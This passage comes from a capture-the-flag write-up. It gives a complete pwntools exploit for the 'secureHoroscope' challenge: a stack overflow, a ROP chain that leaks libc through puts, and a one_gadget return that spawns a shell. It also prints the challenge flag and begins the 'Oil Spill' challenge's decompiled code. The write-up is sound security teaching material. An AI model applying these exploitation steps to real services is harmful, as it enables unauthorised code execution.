+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># I don&#39;t know but somehow, in the server, it didn&#39;t return the puts_plt immediately</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Somehow, I need to send something first before getting the leaked puts address</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># So, I decided to send another payload to return to getInfo again</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>send(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x78</span> <span style="color:#555">+</span> p64(getInfo))
+</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip() <span style="color:#09f;font-style:italic"># Finally got the leaked libc</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>leaked_puts <span style="color:#555">=</span> u64(out<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;leaked_puts   : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leaked_puts)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> leaked_puts <span style="color:#555">-</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> libc_base
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;libc base     : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, after we got the libc base address, we can simply use <code>one_gadget</code> to gain the shell address (with constraints). Now, for the last step, overwrite the <code>getInfo</code> return pointer with the shell.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>one_gadget <span style="color:#555">=</span> <span style="color:#f60">0x4f302</span> <span style="color:#09f;font-style:italic"># [rsp+0x40] == NULL</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x78</span> <span style="color:#555">+</span> p64(libc_base<span style="color:#555">+</span>one_gadget)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>send(payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we got the shell 😃
+<p class="markdown-image">
+  <img src="https://i.imgur.com/lD0JJl7.png" alt=""  />
+</p>
+Below is the full solver script:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> p64, u64, p32, u32
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
+</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./secureHoroscope_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./libc-2.27.so&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./ld-2.27.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>binary <span style="color:#555">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> process([exe<span style="color:#555">.</span>path], env<span style="color:#555">=</span>{})
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>PLT_DEBUG:
+</span></span><span style="display:flex;"><span>            gdb<span style="color:#555">.</span>attach(r, gdbscript<span style="color:#555">=</span><span style="color:#c30">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">            b *getInfo+93
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">            &#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> remote(<span style="color:#c30">&#34;sechoroscope.sdc.tf&#34;</span>, <span style="color:#f60">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#555">=</span> exe<span style="color:#555">.</span>plt[<span style="color:#c30">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#555">=</span> exe<span style="color:#555">.</span>got[<span style="color:#c30">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>one_gadget <span style="color:#555">=</span> <span style="color:#f60">0x4f302</span> <span style="color:#09f;font-style:italic"># [rsp+0x40] == NULL</span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#555">=</span> <span style="color:#f60">0x0000000000400873</span> <span style="color:#09f;font-style:italic"># pop rdi; ret</span>
+</span></span><span style="display:flex;"><span>getInfo <span style="color:#555">=</span> exe<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;getInfo&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;feel</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, p64(puts_plt)<span style="color:#555">+</span>p64(getInfo))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Ret to getInfo again</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>()
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Ret2getInfo again&#39;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x78</span> <span style="color:#555">+</span> p64(getInfo)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;horoscope</span><span style="color:#c30;font-weight:bold">\n\n</span><span style="color:#c30">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Pop puts_got to rdi, ret to puts_plt (First input, got this via observation in GDB)</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>()
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Time to leak libc base...&#39;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x78</span> <span style="color:#555">+</span> p64(pop_rdi) <span style="color:#555">+</span> p64(puts_got)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>send(payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># I don&#39;t know but somehow, in the server, it didn&#39;t return the puts_plt immediately</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Somehow, I need to send something first before getting the leaked puts address</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># So, I decided to send another payload to return to getInfo again</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>send(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x78</span> <span style="color:#555">+</span> p64(getInfo))
+</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip() <span style="color:#09f;font-style:italic"># Finally got the leaked libc</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>leaked_puts <span style="color:#555">=</span> u64(out<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;leaked_puts   : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leaked_puts)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> leaked_puts <span style="color:#555">-</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> libc_base
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;libc base     : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Finally, ret 2 shell (one_gadget)</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>()
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Time to ret2one_gadget...&#39;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x78</span> <span style="color:#555">+</span> p64(libc_base<span style="color:#555">+</span>one_gadget)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>send(payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Flag: sdctf{Th0s3_d4rN_P15C3s_g0t_m3}</p>
+</blockquote>
+<h3 id="oil-spill">Oil Spill <a href="#oil-spill" class="anchor">#</a></h3>
+<h4 id="initial-analysis-2">Initial Analysis <a href="#initial-analysis-2" class="anchor">#</a></h4>
+<p>We were given a binary and Dockerfile. Let&rsquo;s disassemble the binary first</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">main</span>(undefined8 param_1,undefined8 param_2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  undefined8 in_R9;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_148 [<span style="color:#f60">312</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;%p, %p, %p, %p</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,puts,printf,local_148,temp,in_R9,param_2);
